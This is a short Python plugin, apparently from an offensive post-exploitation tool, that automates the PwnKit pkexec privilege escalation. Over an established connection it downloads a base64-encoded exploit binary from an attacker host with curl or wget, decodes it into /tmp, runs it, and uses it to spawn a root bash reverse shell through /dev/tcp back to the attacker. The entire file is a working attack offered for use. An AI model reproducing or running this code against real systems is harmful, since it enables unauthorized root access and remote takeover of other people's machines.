from plugin.core import core
import time

class pkexec:
    def exploit(self, socks, ip, port, re_ip, re_port):
        time.sleep(2)
        core.send_command(socks, 'which curl')
        response = core.recv_response(socks,4)
        if '/curl' in response:
            download_command = f"curl http://{ip}:{port}/plugin/pkexec.txt | base64 -d > /tmp/PwnKit"
        else:
            download_command = f"wget http://{ip}:{port}/plugin/pkexec.txt -O - | base64 -d > /tmp/PwnKit"
        core.send_command(socks, download_command)
        time.sleep(10)
        core.send_command(socks, 'chmod +x /tmp/PwnKit')
        time.sleep(1)
        core.send_command(socks, f"/tmp/PwnKit \"/bin/bash -c '/bin/bash -i >& /dev/tcp/{re_ip}/{re_port} 0>&1'\"")
        print("[+] Pkexec privilege escalation completed...")